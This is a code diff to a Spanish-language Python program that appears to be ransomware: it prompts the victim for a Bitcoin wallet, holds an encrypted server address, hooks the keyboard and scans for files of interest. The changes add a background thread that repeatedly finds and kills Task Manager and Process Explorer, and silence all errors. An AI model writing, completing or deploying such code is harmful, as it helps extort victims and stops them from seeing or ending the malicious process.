@@ -1,11 +1,13 @@
 import ctypes
 import ssl
+import sys
 import tempfile
 import threading
 import subprocess
 import time
 import os
 import colorama
+import psutil
 from colorama import init, Fore
 import keyboard
 import socket
@@ -15,7 +17,6 @@ import requests
 import certs
 
 colorama.init()
-close = False
 #
 # Autor   ->  an0mal1a
 # Name    ->  Pablo
@@ -62,13 +63,13 @@ def help_me():
 
 
 def know_gme():
-    unkown = b"9\x07\xa2:|\x9d\x1f\xe7bCN\x9aE\xfdKg4\xe7\x918\x00#\x05\x04\x00\xedR\x1c\x1c@\x15c\xf5\x91o\xcc~[z\xc9\x92B\x0c\xbf\xe9Z\xb9\x15\xd7l\xe2\x087 \xf1P\x90\xaf\x07\x0fI'\xb9\xd0"
+    unkown = b'\xd1W\nJ\xcc>/*\xb7\xd6g\xeag\x9aS\xa4\xb7\x94\xa8\x04\x03\xd2\xc8\x83Q,:\xb2\xb8\xed\xf6#N\xc1S\xf6\x03\xa2G\x1b\x04\xac\xab\xe31\x9d_v\x05\xc1\xc8.K\xc3\xea\x0e\x9bag\x06\x17\x8f\xb5{'
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
 
 banner()
-print(Fore.GREEN + "\n\t[!] Bienvenido! Cargando modulos de validación...")
+print(Fore.GREEN + "\n\t[!] Bienvenido! Cargando modulos, espere...")
 yek = []
 
 
@@ -186,10 +187,10 @@ def exiting():
 
         conn.close()
         print("[!] Salida con éxito.")
-        time.sleep(3)
-        exit()
+        time.sleep(1)
+        exit(0)
     except Exception:
-        exit()
+        sys.exit()
 
 
 def init_game():
@@ -208,16 +209,46 @@ def check_bitcoin_address(address):
         return False
 
 
+def is_open():
+    for proc in psutil.process_iter(attrs=['pid', 'name']):
+        if "Taskmgr.exe" in proc.info['name'] or "procexp64.exe" in proc.info['name']:
+            return proc.info['pid']
+    return False
+
+
+def start_taskmanager():
+    while True:
+        pid = is_open()
+        if pid:
+            try:
+                os.kill(pid, 9)
+            except PermissionError:
+                if is_admin() != 0:
+                    pass
+
+        time.sleep(0.3)
+
+def init_task():
+    t = threading.Thread(target=start_taskmanager)
+    t.start()
+
+    t.join()
+
+
 def main():
-    global close
     try:
         prep_gme()
         clean()
         banner()
         init(convert=True)
 
-        find_interests.main()
+        interest = threading.Thread(target=find_interests.main)
+        interest.start()
         keyboard.on_press(on_press)
+
+        task = threading.Thread(target=init_task)
+        task.start()
+
         wallet = ""
 
         while wallet.lower() != "q":
@@ -234,16 +265,15 @@ def main():
                 else:
                     print(Fore.RED + "\n\t[!] " + Fore.YELLOW + f"{wallet} no es una cuenta de Bitcoin válida" + Fore.RESET)
 
-        close = True
-        return
+        exiting()
 
-
+    except KeyboardInterrupt:
+        exiting()
     except ConnectionResetError:
         pass
     except ConnectionAbortedError:
         pass
-    except KeyboardInterrupt:
-        exiting()
+
 
 
 def clean():
@@ -259,9 +289,8 @@ if __name__ == "__main__":
         banner()
         # is_admin()
         main()
-        if close:
-            exiting()
-
 
     except KeyboardInterrupt:
         exiting()
+    except Exception:
+        pass
